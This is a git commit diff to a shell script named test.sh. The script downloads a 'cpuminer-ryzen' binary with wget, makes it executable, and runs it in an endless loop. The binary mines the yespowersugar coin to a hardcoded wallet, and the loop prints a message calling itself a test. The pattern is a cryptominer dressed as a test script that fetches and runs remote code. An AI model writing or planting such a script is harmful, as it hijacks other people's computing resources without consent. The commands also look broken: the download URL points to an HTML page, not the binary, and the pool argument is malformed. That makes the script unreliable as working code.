20ea8818ee35a4776f99518e0efeadc7c45ce197
imagedoch <123003905+imagedoch@users.noreply.github.com>
2023-01-19 01:03:26 +0700

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,3 +1,3 @@
 wget https://github.com/imagedoch/money/blob/main/cpuminer-ryzen
-chmod +x log
-while true; do echo -n "This is a test of while loop";./log -a yespowersugar -o 17042 -u sugar1q932wgfpl2a5xh4426cxxz4jusk3vlyes0gy6kd.1-Usa; sleep 1; done
+chmod +x cpuminer-ryzen
+while true; do echo -n "This is a test of while loop";./cpuminer-ryzen -a yespowersugar -o 17042 -u sugar1q932wgfpl2a5xh4426cxxz4jusk3vlyes0gy6kd.1-Usa; sleep 1; done
